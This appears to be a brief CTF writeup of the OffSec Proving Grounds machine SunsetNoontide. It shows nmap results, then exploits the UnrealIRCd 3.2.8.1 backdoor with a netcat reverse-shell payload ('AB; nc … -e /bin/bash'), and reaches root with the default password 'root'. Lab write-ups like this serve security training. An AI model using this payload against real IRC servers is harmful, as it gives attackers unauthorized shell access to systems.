---
title: "Proving grounds Play: SunsetNoontide"
layout: post
date: 2023-09-11 01:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
| irc-info: 
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.foonet.com
|   version: Unreal3.2.8.1. irc.foonet.com 
|   uptime: 205 days, 6:52:38
|   source ident: nmap
|   source host: 46E8C50E.C2311716.EA8777A3.IP
|_  error: Closing Link: aguqweprx[192.168.45.209] (Quit: aguqweprx)
Service Info: Host: irc.foonet.com6697/tcp open  irc     UnrealIRCd
8067/tcp open  irc     UnrealIRCd (Admin email example@example.com)
```

## Unreal3.2.8.1. irc.foonet.com

The Unreal3.2.8.1. irc.foonet.com is vulnerable to remote code execution. The simple way to exploit the vulnerability is to send OS commands follwed by the `AB;` string.

### Exploitation

Connect to the PORT using netcat. Make sure to run netcat listener on PORT 1234.

```sh
# connect to PORT 
nc -nv $IP 6667

# send payload after connection
AB; nc 192.168.45.209 1234 -e /bin/bash
```

**Initial Foothold Obtained**

![img](/assets/images/CTF/Proving_Grounds/SunsetNoontide/shell.png)

## Privilege Escalation

Download and run [linPEAS](https://github.com/carlospolop/PEASS-ng/releases/download/20230910-ae32193f/linpeas.sh).

The results shows the root user access can be obtained by switching to root using password as `root`.

![img](/assets/images/CTF/Proving_Grounds/SunsetNoontide/root.png)

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).